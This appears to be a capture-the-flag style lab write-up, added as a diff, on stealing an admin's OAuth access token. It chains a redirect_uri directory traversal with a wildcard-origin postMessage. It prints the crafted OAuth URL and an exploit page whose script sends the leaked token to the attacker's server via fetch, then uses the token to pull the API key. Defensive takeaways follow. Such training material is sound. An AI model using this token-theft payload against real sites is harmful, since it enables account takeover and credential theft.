@@ -1,0 +1,82 @@
+Lab: Stealing OAuth Access Tokens via a Proxy Page
+
+Level: Expert
+Vulnerability Type: OAuth Misconfiguration, Token Leak via postMessage
+Objective: Exfiltrate the admin’s OAuth access token using a secondary client-side vulnerability, then extract their API key using the stolen token.
+
+Summary
+The lab involves exploiting a flawed redirect_uri validation in combination with an insecure postMessage implementation on the blog website. These flaws enable an attacker to intercept the admin’s access token and use it to access protected resources.
+
+Key Observations
+OAuth Flow Analysis:
+
+The application uses OAuth to authenticate users.
+
+During the OAuth flow, the access token is returned in a URL fragment (#access_token=...).
+
+The OAuth service accepts redirect_uri values containing directory traversal sequences like /../.
+
+Client-Side Flaw:
+
+The blog page embeds the comment form at /post/comment/comment-form inside an <iframe>.
+
+This form uses the postMessage() API to send its full window.location.href (including the access token fragment) to its parent window.
+
+The message origin check is insecure as it uses the wildcard *, allowing any site to receive the message.
+
+Exploitation Strategy
+Crafting the OAuth URL with Directory Traversal:
+
+Use a directory traversal payload in the redirect_uri parameter to redirect the token to /post/comment/comment-form.
+
+Sample payload:
+
+
+https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?
+client_id=YOUR-LAB-CLIENT_ID
+&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form
+&response_type=token
+&nonce=RANDOM_VALUE
+&scope=openid%20profile%20email
+Creating the Exploit Page:
+
+Host the exploit on the provided exploit server.
+
+The page includes an <iframe> loading the OAuth URL and a script to capture the message:
+
+
+<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
+
+<script>
+    window.addEventListener('message', function(e) {
+        fetch("/" + encodeURIComponent(e.data.data));
+    }, false);
+</script>
+Testing the Exploit:
+
+Click “View exploit” and confirm the iframe loads and triggers a request in the exploit server access log.
+
+The request should include the access token in the URL fragment passed through postMessage.
+
+Executing the Attack:
+
+Deliver the exploit to the victim.
+
+Retrieve the stolen access token from the access log.
+
+In Burp Repeater, send a GET /me request with the Authorization: Bearer header set to the stolen token.
+
+Extracting the API Key:
+
+The /me endpoint returns user information, including the API key.
+
+Final Step
+Submit the extracted API key using the lab interface to solve the challenge.
+
+Key Takeaways
+Never use a wildcard (*) as the target origin in postMessage(). Always validate the sender’s origin.
+
+Avoid leaking sensitive data in URL fragments or paths that can be captured by embedded iframes or scripts.
+
+Validate redirect_uri values strictly against an exact list of allowed domains and paths.
+
